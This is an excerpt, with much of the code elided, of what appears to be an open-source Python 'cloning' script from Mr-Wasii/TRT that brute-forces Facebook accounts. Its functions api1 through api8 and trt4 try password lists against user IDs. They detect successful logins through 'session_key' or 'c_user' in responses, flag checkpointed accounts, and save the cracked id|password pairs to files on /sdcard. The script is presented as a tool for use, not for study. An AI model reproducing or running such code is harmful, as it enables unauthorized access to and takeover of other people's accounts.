...
Script open source by Mr-Wasii 

Orignal code of TRT

Github : Mr-Wasii 

Give credit to TRT if you dont want to give credit
...
logo=("""\033[1;91m
 ...
 \033[1;97m | $$ / \ | $$  ______    _______  \$$ ______ ____        
...
def menu():
		...
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			...
			if xd in ['1','01']:
				...
				os.system('xdg-open https://chat.whatsapp.com/FKDK2kjK5to7IGBkx4fUcr')
...
def api1(ids,names,passlist):
		...
		try:
			...
			sys.stdout.write('\r\r\033[1;37m [WASII-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			...
			for pw in passlist:
				...
				if 'session_key' in q:
					...
					print('\r\r\033[1;32m [WASII-OK] '+ids+' | '+pas+'\033[1;97m')

					open('/sdcard/WASII-OK.txt','a').write(ids+'|'+pas+'\n')
					...
					if 'y' in pcp:
						...
						print('\r\r\x1b[38;5;205m [WASII-CP] '+ids+' | '+pas+'\033[1;97m')

						open('/sdcard/WASII-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        ...
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [WASII-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api3(ids,names,passlist):
        ...
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [WASII-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api4(ids,names,passlist):
        ...
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [WASII-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                print('\r\r\x1b[38;5;206m [WASII-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api5(ids,names,passlist):
        ...
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [WASII-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api6(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;37m [WASII-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in TRT:
				...
				print('\r\r\033[1;32m [WASII-OK] %s | %s'%(ids,pas))
...
def api7(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;37m [WASII-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api8(ids,names,passlist):
	...
	sys.stdout.write('\r\r\033[1;37m [WASII-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [WASII-OK] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/WASII-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [WASII-CP] '+str(uid)+' | '+pas+'\033[1;97m')

                                        open('/sdcard/WASII-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
	...
	try:
		...
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				print('\r\r\033[1;32m [WASII-OK] '+udx+' | '+pas+'\033[1;97m')

				open('/sdcard/WASII-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				...
				open('/sdcard/WASII-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        #open('/sdcard/WASII-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
...
def trt4(ids,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [WASII-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print('\r\r\033[1;34m [WASII-2F] '+uid+' | '+pas)

					else:

						print(f'\r\x1b[1;32m [WASII-OK] '+uid+' | '+pas)

						open('/sdcard/WASII-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [WASII-CP] '+uid+' | '+pas+'\033[1;97m')

					open('/sdcard/WASII-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
